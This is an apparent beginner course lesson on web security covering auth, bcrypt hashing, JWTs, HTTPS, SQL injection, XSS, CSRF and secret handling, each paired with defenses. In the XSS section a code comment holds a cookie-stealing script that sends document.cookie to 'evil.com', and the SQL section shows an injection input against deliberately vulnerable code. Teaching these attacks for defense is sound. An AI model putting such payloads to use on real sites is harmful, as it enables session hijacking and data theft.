# Security: Auth, HTTPS & Common Vulnerabilities

*Going Deeper · About 55 minutes*

<div class="lesson-audio">
  <audio controls preload="metadata" src="../../audio/12.mp3">
    Your browser does not support the audio element.
  </audio>
  <span class="lesson-audio__label">Lesson overview · ~75 sec</span>
</div>

## Where we're headed

Security is not a feature you bolt on at the end — it's a set of habits you build into every layer of an application. This lesson covers the two ideas that underlie almost every security decision (authentication vs. authorization), how passwords and login sessions actually work, the most common attacks developers accidentally enable, and the practical steps that prevent them.

## Concepts & Terminology

### Authentication vs. Authorization

These two words are easy to mix up, but they answer different questions:

- **Authentication** — *Who are you?* Verifying that a user is who they claim to be. Logging in with a username and password is an authentication step.
- **Authorization** — *What are you allowed to do?* Deciding which resources or actions the authenticated user can access. A logged-in user can view their own profile; they cannot view someone else's — that's authorization.

Both checks are required. Getting authentication right means nothing if every authenticated user can reach every resource.

### Passwords and Hashing

Passwords must never be stored in plain text. If your database is ever breached, an attacker who finds plain text passwords immediately has access to every account — and probably many other accounts too, since users reuse passwords.

The standard approach is **hashing with bcrypt**:

1. When a user sets a password, you hash it (a one-way transformation) and store only the hash.
2. When a user logs in, you hash what they typed and compare hashes. The original password is never stored anywhere.

**bcrypt** adds a **salt** (random data mixed in before hashing) so that two users with the same password produce different hashes, and so that precomputed "rainbow table" attacks don't work.

```javascript
const bcrypt = require('bcryptjs');

// When a user registers
const hash = await bcrypt.hash(req.body.password, 10); // 10 = cost factor
await db.query('INSERT INTO users (email, password_hash) VALUES (?, ?)', [email, hash]);

// When a user logs in
const match = await bcrypt.compare(req.body.password, storedHash);
if (!match) return res.status(401).json({ error: 'Invalid credentials' });
```

Never compare passwords with `===`. Use the library's compare function — it runs in constant time to prevent **timing attacks** (where an attacker infers information from how long a comparison takes).

<figure class="lesson-figure" role="img" aria-label="Diagram of password hashing: at sign up the plain-text password is hashed with bcrypt and stored; at login the entered password is hashed again and compared against the stored hash, and the plain password is never stored">
  <svg viewBox="0 0 640 200" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:auto;font-family:var(--font-body);">
    <text x="0" y="16" font-size="11" fill="var(--ink-faint)" font-family="var(--font-mono)">THE PLAIN PASSWORD NEVER GETS STORED</text>
    <text x="0" y="42" font-size="11" fill="var(--ink-soft)" font-weight="600">SIGN UP</text>
    <rect x="0" y="52" width="130" height="46" rx="6" fill="var(--paper)" stroke="var(--line)" stroke-width="1.5"/>
    <text x="65" y="72" font-size="11" text-anchor="middle" fill="var(--ink)">Password</text>
    <text x="65" y="87" font-size="9.5" text-anchor="middle" fill="var(--ink-faint)">(plain text)</text>
    <rect x="220" y="52" width="150" height="46" rx="6" fill="var(--accent-gold-soft)" stroke="var(--accent-gold)" stroke-width="1.5"/>
    <text x="295" y="80" font-size="12" text-anchor="middle" fill="var(--ink)" font-family="var(--font-mono)">bcrypt.hash()</text>
    <rect x="470" y="52" width="150" height="46" rx="6" fill="var(--paper)" stroke="var(--line)" stroke-width="1.5"/>
    <text x="545" y="72" font-size="11" text-anchor="middle" fill="var(--ink)">Stored hash</text>
    <text x="545" y="87" font-size="9.5" text-anchor="middle" fill="var(--ink-faint)">in the database</text>
    <line x1="130" y1="75" x2="220" y2="75" stroke="var(--ink-soft)" stroke-width="1.5"/>
    <line x1="370" y1="75" x2="470" y2="75" stroke="var(--ink-soft)" stroke-width="1.5"/>
    <text x="0" y="132" font-size="11" fill="var(--ink-soft)" font-weight="600">LOG IN</text>
    <rect x="0" y="142" width="130" height="46" rx="6" fill="var(--paper)" stroke="var(--line)" stroke-width="1.5"/>
    <text x="65" y="162" font-size="11" text-anchor="middle" fill="var(--ink)">Password</text>
    <text x="65" y="177" font-size="9.5" text-anchor="middle" fill="var(--ink-faint)">(typed at login)</text>
    <rect x="220" y="142" width="150" height="46" rx="6" fill="var(--accent-gold-soft)" stroke="var(--accent-gold)" stroke-width="1.5"/>
    <text x="295" y="170" font-size="12" text-anchor="middle" fill="var(--ink)" font-family="var(--font-mono)">bcrypt.hash()</text>
    <rect x="470" y="142" width="150" height="46" rx="6" fill="var(--accent-sage-soft)" stroke="var(--accent-sage)" stroke-width="1.5"/>
    <text x="545" y="170" font-size="12" text-anchor="middle" fill="var(--ink)" font-family="var(--font-mono)">compare()</text>
    <line x1="130" y1="165" x2="220" y2="165" stroke="var(--ink-soft)" stroke-width="1.5"/>
    <line x1="370" y1="165" x2="470" y2="165" stroke="var(--ink-soft)" stroke-width="1.5"/>
    <path d="M545,142 L545,98" fill="none" stroke="var(--accent-sage)" stroke-width="1.5" stroke-dasharray="4 3"/>
    <text x="552" y="122" font-size="9.5" fill="var(--accent-sage)">checks against</text>
  </svg>
  <figcaption>Two different plain-text passwords produce completely different hashes, and the process can't run backward — even a stolen database of hashes doesn't hand over anyone's actual password.</figcaption>
</figure>

### Sessions vs. Tokens (JWT)

After a user authenticates, the server needs a way to remember them across requests. Two common approaches:

**Session-based auth** — the server stores session data (user ID, expiry) and gives the browser a session cookie with a random ID. On each request the browser sends the cookie; the server looks up the session.

**Token-based auth (JWT)** — the server creates a **JSON Web Token**: a signed JSON payload (user ID, roles, expiry) encoded as a string. The browser stores it and sends it in every request header. The server verifies the signature — no database lookup needed.

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

JWTs are stateless and scale easily, but they can't be revoked until they expire — a consideration for logout and account suspension flows. Sessions are revocable but require server-side storage.

### HTTPS and TLS

**HTTPS** encrypts the connection between the browser and your server using **TLS (Transport Layer Security)**. Without it, anyone on the same network (coffee shop Wi-Fi, ISP, a corporate proxy) can read every request and response — login credentials, tokens, personal data.

In practice:
- All modern hosting platforms (Vercel, Netlify, Render, GitHub Pages) provide HTTPS automatically via Let's Encrypt certificates.
- Never serve a login form or API over plain HTTP. Browsers now warn users loudly when you do.
- Use `Secure` and `HttpOnly` flags on cookies: `Secure` prevents cookies from being sent over HTTP; `HttpOnly` prevents JavaScript from reading them (which blocks a class of XSS attacks).

### SQL Injection

SQL injection is one of the oldest and most damaging attacks. It happens when user input is interpolated directly into a SQL query:

```javascript
// Vulnerable — never do this
const id = req.params.id;  // attacker sends: 1 OR 1=1
db.query(`SELECT * FROM users WHERE id = ${id}`);
// Becomes: SELECT * FROM users WHERE id = 1 OR 1=1
// Returns every row in the table
```

The fix is **parameterized queries** (also called prepared statements). The database receives the SQL and the values separately, so user input can never become part of the query structure:

```javascript
// Safe
db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
```

If you use an ORM (like Prisma or Sequelize), it uses parameterized queries automatically.

### Cross-Site Scripting (XSS)

XSS happens when user-supplied text is injected into a page as HTML without being sanitized, allowing an attacker to run JavaScript in another user's browser:

```javascript
// Vulnerable — attacker submits: <script>document.location='evil.com?c='+document.cookie</script>
res.send('<h1>Hello, ' + req.query.name + '</h1>');
```

Defenses:
- **Escape output** — use a templating engine that escapes HTML by default (Handlebars, Nunjucks, React JSX).
- **Avoid `innerHTML`** with user data — use `textContent` or the framework's data-binding instead.
- Set a **Content Security Policy (CSP)** header to restrict which scripts the browser will execute.

### Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in user's browser into sending a request to your server on an attacker's behalf — for example, by embedding a form on a malicious site that submits to your API when the user visits it. The browser automatically includes the user's cookies, so the server thinks it's a legitimate request.

Defenses:
- **CSRF tokens** — include a secret token in every form that the server verifies; an attacker's site can't read it.
- **SameSite cookies** — the `SameSite=Strict` or `SameSite=Lax` cookie attribute tells the browser not to include the cookie in cross-site requests.
- APIs that use token-based auth (Authorization header) are not vulnerable to CSRF — cross-site requests can't set arbitrary headers.

### Environment Variables

API keys, database passwords, and JWT secrets must never appear in source code or be committed to a repository.

```bash
# .env  — add this file to .gitignore immediately
DATABASE_URL=postgresql://user:password@host/db
JWT_SECRET=a-long-random-string
STRIPE_SECRET_KEY=sk_live_...
```

```javascript
// Access in Node.js
const secret = process.env.JWT_SECRET;
```

In production, set these through your hosting platform's environment configuration — not by uploading a `.env` file. If a secret is ever accidentally committed, rotate it immediately, even if the commit is later deleted (it may be cached in git history or CI logs).

## Technology

- **bcryptjs** — pure-JavaScript bcrypt for password hashing. (`npm install bcryptjs`)
- **jsonwebtoken** — sign and verify JWTs in Node.js. (`npm install jsonwebtoken`)
- **helmet** — Express middleware that sets secure HTTP headers (CSP, HSTS, X-Frame-Options, and more) with a single line. (`app.use(helmet())`)
- **Let's Encrypt / platform TLS** — free, automatic HTTPS certificates. Vercel, Netlify, and Render handle this without any configuration.
- **Supabase Auth** — the auth system this course uses. It handles password hashing, sessions, and JWTs so you don't implement auth from scratch.

## Soft Skills

Security decisions are judgment calls made under pressure. A few habits that help:

- **OWASP Top 10** — the Open Web Application Security Project publishes a ranked list of the most critical web security risks. Skimming it once gives you a map of the threat landscape even if you don't memorize the details.
- **Principle of least privilege** — give each user, service, or database role only the minimum access it needs. An API that only reads data shouldn't have write permissions.
- **Default to deny** — in authorization logic, start from "no access" and explicitly grant what's allowed. Starting from "full access" and removing things leads to gaps.
- **Don't roll your own auth** — authentication is subtle and the failure modes are severe. Use an established library or service (Supabase Auth, Auth.js, Passport.js) rather than building from scratch.
- **Security is a process, not a feature** — dependencies get vulnerabilities, secrets leak, attack patterns evolve. Run `npm audit` regularly and stay subscribed to security advisories for your major dependencies.

## Try It

The interactive below presents code snippets and scenarios — classify each as the type of vulnerability it represents, or as safe.

## Recap

- Authentication proves who a user is; authorization decides what they can do. Both are required.
- Passwords are hashed (with bcrypt) before storage — never stored in plain text.
- Sessions and JWTs are the two main strategies for keeping a user "logged in" across requests.
- HTTPS encrypts traffic in transit; all modern hosts provide it for free.
- SQL injection is prevented by parameterized queries; XSS by escaping output and avoiding `innerHTML` with user data.
- API keys and secrets live in environment variables, never in code or repositories.
